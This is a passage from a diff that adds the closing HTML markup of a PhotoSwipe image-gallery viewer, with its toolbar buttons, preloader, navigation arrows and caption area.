+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
